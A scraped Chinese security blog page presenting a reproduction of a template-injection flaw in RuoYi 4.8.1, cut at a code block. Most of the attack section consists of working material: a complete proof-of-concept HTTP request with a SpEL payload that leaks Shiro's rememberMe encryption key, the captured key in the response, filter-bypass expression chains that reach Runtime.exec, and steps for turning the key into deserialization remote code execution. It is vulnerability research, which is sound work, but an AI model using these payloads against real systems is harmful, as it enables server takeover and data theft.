()（带空格的类型引用） ❌ param（参数引用） 通过链式调用是可以成功执行的，因此表达式格式可以使用方法链式调用。之前的利用链不可用，经过查找，发现可以在SecurityManager 中获取 getRuntime 方法，根据之前payload的调用方法，构造出以下利用链:\n获取SecurityManager → 获取Class → 获取ClassLoader → 加载Runtime类 → 获取getRuntime方法 → 获取Runtime实例 → 获取exec方法 → 执行系统命令\n那么构造出如下利用链：\nplain\r1 fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods().?[name=='getRuntime'][0].invoke(null).exec('calc'))}|__::.x 直接500报错，那么为什么这个链看起来是正常的却不能执行？\n先一步一步来，一点一点删除调用的方法，直到删除到loadClass('java.lang.Runtime') 这个地方成功输出。\nplain\r1 fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime'))}|__::.x 看来是有某个安全监测机制不让获取getRuntime方法，那么还有机会能绕过吗？有的。在 SpEL 中，对于无参数的方法调用，括号 () 是可选的，getMethods()和getMethods作用是一样的，那么试一下把括号去掉是否报错。没有报错，成功获取到getRuntime方法\nplain\r1 fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0])}|__::.x 那现在继续调试上面完整的利用链。现在只获取到了方法，但是没反射调用，\nplain\r1 fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null).getClass.getMethods.?[name=='exec'][0])}|__::.x 由于获取到的是第一个exec方法，在查找当前exec方法的用法后，构造以下利用链：\nplain\r1 fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null).getClass.getMethods.?[name=='exec'][0].invoke(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null),'calc',null))}|__::.x 等价于Runtime.exec(Runtime.getRuntime,\"calc\");,意思就是执行 Runtime.getRuntime 中的 exec方法\nPayload 解析 fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x\n拼接后完整视图名变为：monitor/cache/cache::__|${...SpEL...}|__::.x\n第一层：__|${...SpEL表达式...}|__::.x\nThymeleaf 预处理标记，__...__ 之间的内容会在视图解析之前先被预处理执行\n|...| 是 Thymeleaf 的字面量替换语法，${...} 内部为 SpEL 表达式\n伪造一个不存在的片段名 .x，使其符合 模板::片段 的语法格式，否则解析会报错\n第二层：#response.getWriter().print(...)\n#response Thymeleaf 上下文中内置的 HttpServletResponse 对象\n.getWriter() 获取响应的 PrintWriter，可以直接向 HTTP 响应体写内容\n.print(...) 将结果直接写入 HTTP 响应，攻击者在响应中就能看到输出\n**第三层： **@securityManager.rememberMeManager.cipherKey\n@securityManager SpEL 的 @beanName 语法，从 Spring 容器中按名称获取 Bean。RuoYi 使用 Shiro，会注册一个名为 securityManager 的 Bean\n.rememberMeManager 获取 Shiro SecurityManager 中的 RememberMe 管理器（CookieRememberMeManager）\n.cipherKey 获取 RememberMe 功能使用的 AES 加密密钥（byte[] 类型）\n第四层：\n因为 cipherKey 是 byte[]，直接 print 会乱码，所以需要 Base64 编码：\njava\r1 2 3 4 5 ''.getClass() .forName('java.util.Base64') // 反射加载 Base64 类 .getMethod('getEncoder') // 获取静态方法 getEncoder() .invoke(null) // 调用静态方法，返回 Base64.Encoder .encodeToString(cipherKey) // 将 byte[] 编码为可读字符串 漏洞链：泄露 Shiro Key → 反序列化 RCE 泄露的密钥是 Shiro RememberMe Cookie 的 AES 加密密钥。攻击者拿到此密钥后：\n使用 ysoserial 等工具生成恶意 Java 反序列化 payload\n用泄露的 AES Key 加密该 payload\n作为 rememberMe Cookie 发送\nShiro 解密 → 反序列化 → 远程代码执行（RCE）\n","wordCount":"2202","inLanguage":"en","datePublished":"2026-01-07T10:00:00+08:00","dateModified":"2026-01-07T10:00:00+08:00","author":{"@type":"Person","name":{"name":"xvsf"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xvshifu.github.io/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/"},"publisher":{"@type":"Organization","name":"xvsf","logo":{"@type":"ImageObject","url":"https://xvshifu.github.io/xvsf/img/2.jpg"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://xvshifu.github.io/xvsf/ accesskey=h title="xvsf (Alt + H)">xvsf</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://xvshifu.github.io/xvsf/ title=首页><span>首页</span></a></li><li><a href=https://xvshifu.github.io/xvsf/posts/ title=文章><span>文章</span></a></li><li><a href=https://xvshifu.github.io/xvsf/categories/ title=归类><span>归类</span></a></li><li><a href=https://xvshifu.github.io/xvsf/archives/ title=归档><span>归档</span></a></li><li><a href=https://xvshifu.github.io/xvsf/search/ title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://xvshifu.github.io/xvsf/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://xvshifu.github.io/xvsf/>Home</a>&nbsp;»&nbsp;<a href=https://xvshifu.github.io/xvsf/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE</h1><div class=post-meta><span title='2026-01-07 10:00:00 +0800 CST'>January 7, 2026</span>&nbsp;·&nbsp;<span class=reading-time-coffee title='预计阅读 5 分钟'>☕☕ 5 min</span>&nbsp;·&nbsp;<span class=word-count title='全文约 2202 字'>📄 2.2k 字</span>&nbsp;·&nbsp;map[name:xvsf]&nbsp;·&nbsp;</div></header><div class=post-content style=position:relative><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0 aria-label=参考文章：>参考文章：</a></li><li><a href=#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba aria-label=环境搭建>环境搭建</a></li><li><a href=#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0 aria-label=漏洞复现>漏洞复现</a></li><li><a href=#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90 aria-label=漏洞分析>漏洞分析</a><ul><li><a href=#%e6%bc%8f%e6%b4%9e%e7%82%b9 aria-label=漏洞点>漏洞点</a></li><li><a href=#payload-%e8%a7%a3%e6%9e%90 aria-label="Payload 解析">Payload 解析</a></li><li><a href=#%e6%bc%8f%e6%b4%9e%e9%93%be%e6%b3%84%e9%9c%b2-shiro-key--%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-rce aria-label="漏洞链：泄露 Shiro Key → 反序列化 RCE">漏洞链：泄露 Shiro Key → 反序列化 RCE</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><h1 id=参考文章>参考文章：<a hidden class=anchor aria-hidden=true href=#参考文章>#</a></h1><p>若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)</p><p><a href=https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ>https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</a></p><p>某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)</p><p><a href=https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw>https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw</a></p><h1 id=环境搭建>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建>#</a></h1><p>源码：</p><p><a href=https://github.com/yangzongzhuan/RuoYi/releases>https://github.com/yangzongzhuan/RuoYi/releases</a></p><p>参考文档：RuoYi-4.8.1\doc\若依环境使用手册.docx</p><p>导入数据库</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144229.png style=max-width:100%;height:auto></p><p>修改数据库配置：RuoYi-4.8.1\ruoyi-admin\src\main\resources\application-druid.yml</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144591.png style=max-width:100%;height:auto></p><p>服务器端口：RuoYi-4.8.1\ruoyi-admin\src\main\resources\application.yml</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144282.png style=max-width:100%;height:auto></p><p>启动若依</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145405.png style=max-width:100%;height:auto>
+<img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145541.png style=max-width:100%;height:auto></p><p>默认密码为 admin/admin123</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145857.png style=max-width:100%;height:auto>
+<img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144394.png style=max-width:100%;height:auto></p><h1 id=漏洞复现>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现>#</a></h1><p>POC：</p><div class=code-block-container id=code-1772964307938274700 data-expanded=false role=region aria-labelledby=btn-code-1772964307938274700><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>html</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307938274700 title=Toggle aria-expanded=false aria-controls=code-1772964307938274700 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307938274700-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks> 1</span>
+</span><span class=lnt id=2><span class=lnlinks> 2</span>
+</span><span class=lnt id=3><span class=lnlinks> 3</span>
+</span><span class=lnt id=4><span class=lnlinks> 4</span>
+</span><span class=lnt id=5><span class=lnlinks> 5</span>
+</span><span class=lnt id=6><span class=lnlinks> 6</span>
+</span><span class=lnt id=7><span class=lnlinks> 7</span>
+</span><span class=lnt id=8><span class=lnlinks> 8</span>
+</span><span class=lnt id=9><span class=lnlinks> 9</span>
+</span><span class=lnt id=10><span class=lnlinks>10</span>
+</span><span class=lnt id=11><span class=lnlinks>11</span>
+</span><span class=lnt id=12><span class=lnlinks>12</span>
+</span><span class=lnt id=13><span class=lnlinks>13</span>
+</span><span class=lnt id=14><span class=lnlinks>14</span>
+</span><span class=lnt id=15><span class=lnlinks>15</span>
+</span><span class=lnt id=16><span class=lnlinks>16</span>
+</span><span class=lnt id=17><span class=lnlinks>17</span>
+</span><span class=lnt id=18><span class=lnlinks>18</span>
+</span><span class=lnt id=19><span class=lnlinks>19</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>POST /monitor/cache/getNames  HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 127.0.0.1
+</span></span><span class=line><span class=cl>Cookie: JSESSIONID=3e7df59c-7b52-4b63-9828-d1a60bcf62e2; rememberMe=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
+</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
+</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
+</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate, br, zstd
+</span></span><span class=line><span class=cl>sec-ch-ua-mobile: ?0
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class=line><span class=cl>sec-ch-ua: &#34;Not:A-Brand&#34;;v=&#34;99&#34;, &#34;Google Chrome&#34;;v=&#34;145&#34;, &#34;Chromium&#34;;v=&#34;145&#34;
+</span></span><span class=line><span class=cl>sec-ch-ua-platform: &#34;Windows&#34;
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>Referer: http://127.0.0.1/monitor/job
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>fragment=__|$${#response.getWriter().print(&#39;&#39;.getClass().forName(&#39;java.util.Base64&#39;).getMethod(&#39;getEncoder&#39;).invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x</span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144864.png style=max-width:100%;height:auto></p><div class=code-block-container id=code-1772964307938274700 data-expanded=false role=region aria-labelledby=btn-code-1772964307938274700><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>html</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307938274700 title=Toggle aria-expanded=false aria-controls=code-1772964307938274700 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307938274700-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span><span class=lnt id=2><span class=lnlinks>2</span>
+</span><span class=lnt id=3><span class=lnlinks>3</span>
+</span><span class=lnt id=4><span class=lnlinks>4</span>
+</span><span class=lnt id=5><span class=lnlinks>5</span>
+</span><span class=lnt id=6><span class=lnlinks>6</span>
+</span><span class=lnt id=7><span class=lnlinks>7</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>HTTP/1.1 200
+</span></span><span class=line><span class=cl>Content-Type: text/html; charset=ISO-8859-1
+</span></span><span class=line><span class=cl>Content-Language: zh-CN
+</span></span><span class=line><span class=cl>Date: Sat, 07 Mar 2026 02:24:08 GMT
+</span></span><span class=line><span class=cl>Content-Length: 25
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>CEuLWXvwpGKpptw3aVUvQg==</span></span></code></pre></td></tr></table></div></div></div></div><p>shiro 利用</p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144153.png style=max-width:100%;height:auto></p><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144669.png style=max-width:100%;height:auto></p><h1 id=漏洞分析>漏洞分析<a hidden class=anchor aria-hidden=true href=#漏洞分析>#</a></h1><h2 id=漏洞点>漏洞点<a hidden class=anchor aria-hidden=true href=#漏洞点>#</a></h2><p><code>RuoYi-4.8.1\ruoyi-admin\src\main\java\com\ruoyi\web\controller\monitor\CacheController.java</code></p><div class=code-block-container id=code-1772964307938807200 data-expanded=false role=region aria-labelledby=btn-code-1772964307938807200><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>java</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307938807200 title=Toggle aria-expanded=false aria-controls=code-1772964307938807200 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307938807200-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
+</span><span class=lnt id=2><span class=lnlinks>2</span>
+</span><span class=lnt id=3><span class=lnlinks>3</span>
+</span><span class=lnt id=4><span class=lnlinks>4</span>
+</span><span class=lnt id=5><span class=lnlinks>5</span>
+</span><span class=lnt id=6><span class=lnlinks>6</span>
+</span><span class=lnt id=7><span class=lnlinks>7</span>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=nd>@RequiresPermissions</span><span class=p>(</span><span class=s>&#34;monitor:cache:view&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@PostMapping</span><span class=p>(</span><span class=s>&#34;/getNames&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>getCacheNames</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>fragment</span><span class=p>,</span><span class=w> </span><span class=n>ModelMap</span><span class=w> </span><span class=n>mmap</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>mmap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;cacheNames&#34;</span><span class=p>,</span><span class=w> </span><span class=n>cacheService</span><span class=p>.</span><span class=na>getCacheNames</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>prefix</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/cache::&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>fragment</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span></span></span></code></pre></td></tr></table></div></div></div></div><p><img decoding=async loading=lazy src=https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144220.png style=max-width:100%;height:auto></p><p>用户在 http://localhost:80/monitor/cache/getNames 接口处 POST 传入的 <code>&lt;font style="color:#080808;background-color:#ffffff;">fragment&lt;/font></code> 参数，被直接拼接到 Thymeleaf 模板路径中，<code>&lt;font style="color:#080808;background-color:#ffffff;">return&lt;/font></code>返回结果使用 Thymeleaf 片段语法(::)拼接</p><blockquote><p>Thymeleaf片段语法格式为：<code>前缀 + "/cache::" + 片段名</code></p></blockquote><div class=code-block-container id=code-1772964307940044900 data-expanded=false role=region aria-labelledby=btn-code-1772964307940044900><div class=code-header><div class=mac-buttons><span class="mac-button red"></span>
+<span class="mac-button yellow"></span>
+<span class="mac-button green"></span></div><span class=code-language>java</span><div class=code-actions><button class=copy-btn title=Copy aria-label=复制代码>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+</button>
+<button class=toggle-btn id=btn-code-1772964307940044900 title=Toggle aria-expanded=false aria-controls=code-1772964307940044900 aria-label=展开或折叠代码块>
+<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"/></svg></button></div></div><div class=code-content id=code-1772964307940044900-content><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=1><span class=lnlinks>1</span>
